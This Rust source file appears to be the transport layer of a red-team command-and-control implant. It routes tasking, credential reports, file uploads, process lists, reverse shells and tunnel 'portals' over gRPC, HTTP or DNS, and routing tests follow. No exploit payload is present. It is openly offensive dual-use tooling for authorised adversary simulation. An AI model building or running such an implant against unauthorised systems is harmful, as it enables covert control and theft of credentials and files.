use anyhow::{anyhow, Result};
use pb::c2::transport::Type as TransportType;
use pb::{c2::*, config::Config};
use std::sync::mpsc::{Receiver, Sender};

#[cfg(feature = "grpc")]
mod grpc;

#[cfg(feature = "doh")]
mod dns_resolver;

#[cfg(feature = "http1")]
mod http;

#[cfg(feature = "dns")]
mod dns;

#[cfg(feature = "mock")]
mod mock;
#[cfg(feature = "mock")]
pub use mock::MockTransport;

mod transport;
pub use transport::Transport;

#[derive(Clone)]
pub enum ActiveTransport {
    #[cfg(feature = "grpc")]
    Grpc(grpc::GRPC),
    #[cfg(feature = "http1")]
    Http(http::HTTP),
    #[cfg(feature = "dns")]
    Dns(dns::DNS),
    #[cfg(feature = "mock")]
    Mock(mock::MockTransport),
    Empty,
}

impl Transport for ActiveTransport {
    fn init() -> Self {
        Self::Empty
    }

    fn new(config: Config) -> Result<Self> {
        // Extract transport type from config
        let transport_type = config
            .info
            .as_ref()
            .and_then(|info| info.available_transports.as_ref())
            .and_then(|at| {
                let active_idx = at.active_index as usize;
                at.transports
                    .get(active_idx)
                    .or_else(|| at.transports.first())
            })
            .map(|t| t.r#type)
            .ok_or_else(|| anyhow!("No transports configured"))?;

        // Match on the transport type enum
        match TransportType::try_from(transport_type) {
            Ok(TransportType::TransportGrpc) => {
                #[cfg(feature = "grpc")]
                return Ok(ActiveTransport::Grpc(grpc::GRPC::new(config)?));
                #[cfg(not(feature = "grpc"))]
                return Err(anyhow!("gRPC transport not enabled"));
            }
            Ok(TransportType::TransportHttp1) => {
                #[cfg(feature = "http1")]
                return Ok(ActiveTransport::Http(http::HTTP::new(config)?));
                #[cfg(not(feature = "http1"))]
                return Err(anyhow!("http1 transport not enabled"));
            }
            Ok(TransportType::TransportDns) => {
                #[cfg(feature = "dns")]
                return Ok(ActiveTransport::Dns(dns::DNS::new(config)?));
                #[cfg(not(feature = "dns"))]
                return Err(anyhow!("DNS transport not enabled"));
            }
            Ok(TransportType::TransportUnspecified) | Err(_) => {
                Err(anyhow!("Invalid or unspecified transport type"))
            }
        }
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.claim_tasks(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.claim_tasks(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.claim_tasks(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.claim_tasks(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.fetch_asset(request, sender).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_credential(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_credential(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_credential(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_credential(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_file(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_file(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_file(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_file(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_process_list(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_process_list(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_process_list(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_process_list(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_task_output(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_task_output(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_task_output(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_task_output(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.reverse_shell(rx, tx).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.create_portal(rx, tx).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.create_portal(rx, tx).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.create_portal(rx, tx).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.create_portal(rx, tx).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.get_type(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.get_type(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.get_type(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.get_type(),
            Self::Empty => pb::c2::transport::Type::TransportUnspecified,
        }
    }

    fn is_active(&self) -> bool {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.is_active(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.is_active(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.is_active(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.is_active(),
            Self::Empty => false,
        }
    }

    fn name(&self) -> &'static str {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.name(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.name(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.name(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.name(),
            Self::Empty => "none",
        }
    }

    #[allow(clippy::vec_init_then_push)]
    fn list_available(&self) -> Vec<String> {
        let mut list = Vec::new();
        #[cfg(feature = "grpc")]
        list.push("grpc".to_string());
        #[cfg(feature = "http1")]
        list.push("http".to_string());
        #[cfg(feature = "dns")]
        list.push("dns".to_string());
        #[cfg(feature = "mock")]
        list.push("mock".to_string());
        list
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use pb::c2::{AvailableTransports, Beacon};

    // Helper to create a test config with a specific URI, transport type, and extra params
    fn create_test_config(uri: &str, transport_type: i32, extra: &str) -> Config {
        Config {
            info: Some(Beacon {
                available_transports: Some(AvailableTransports {
                    transports: vec![pb::c2::Transport {
                        uri: uri.to_string(),
                        interval: 5,
                        r#type: transport_type,
                        extra: extra.to_string(),
                    }],
                    active_index: 0,
                }),
                ..Default::default()
            }),
            ..Default::default()
        }
    }

    #[tokio::test]
    #[cfg(feature = "grpc")]
    async fn test_routes_to_grpc_transport() {
        // All these prefixes should result in the Grpc variant
        let inputs = vec![
            // Passthrough cases
            "http://127.0.0.1:50051",
            "https://127.0.0.1:50051",
            // Rewrite cases
            "grpc://127.0.0.1:50051",
            "grpcs://127.0.0.1:50051",
        ];

        for uri in inputs {
            let config = create_test_config(uri, TransportType::TransportGrpc as i32, "{}");
            let result = ActiveTransport::new(config);

            // 1. Assert strictly on the Variant type
            assert!(
                matches!(result, Ok(ActiveTransport::Grpc(_))),
                "URI '{}' did not resolve to ActiveTransport::Grpc",
                uri
            );
        }
    }

    #[tokio::test]
    #[cfg(feature = "http1")]
    async fn test_routes_to_http1_transport() {
        // All these prefixes should result in the Http1 variant
        let inputs = vec!["http1://127.0.0.1:8080", "https1://127.0.0.1:8080"];

        for uri in inputs {
            let config = create_test_config(uri, TransportType::TransportHttp1 as i32, "{}");
            let result = ActiveTransport::new(config);

            assert!(
                matches!(result, Ok(ActiveTransport::Http(_))),
                "URI '{}' did not resolve to ActiveTransport::Http",
                uri
            );
        }
    }

    #[tokio::test]
    #[cfg(feature = "dns")]
    async fn test_routes_to_dns_transport() {
        // DNS uses URI for server address, extra field for domain and type
        let inputs = vec![
            ("dns://8.8.8.8:53", r#"{"domain": "example.com"}"#),
            (
                "dns://1.1.1.1:53",
                r#"{"domain": "example.com", "type": "txt"}"#,
            ),
            ("dns://8.8.4.4:53", r#"{"domain": "test.com", "type": "a"}"#),
        ];

        for (uri, extra) in inputs {
            let config = create_test_config(uri, TransportType::TransportDns as i32, extra);
            let result = ActiveTransport::new(config);

            assert!(
                matches!(result, Ok(ActiveTransport::Dns(_))),
                "URI '{}' with extra '{}' did not resolve to ActiveTransport::Dns",
                uri,
                extra
            );
        }
    }

    #[tokio::test]
    #[cfg(not(feature = "grpc"))]
    async fn test_grpc_disabled_error() {
        // If the feature is off, these should error out
        let inputs = vec!["grpc://foo", "grpcs://foo", "http://foo"];
        for uri in inputs {
            let config = create_test_config(uri, TransportType::TransportGrpc as i32, "{}");
            let result = ActiveTransport::new(config);
            assert!(
                result.is_err(),
                "Expected error for '{}' when gRPC feature is disabled",
                uri
            );
        }
    }

    #[tokio::test]
    async fn test_unknown_transport_errors() {
        // Test with unspecified transport type
        let config = create_test_config(
            "ftp://example.com",
            TransportType::TransportUnspecified as i32,
            "{}",
        );
        let result = ActiveTransport::new(config);
        assert!(result.is_err(), "Expected error for unknown transport type");
    }
}
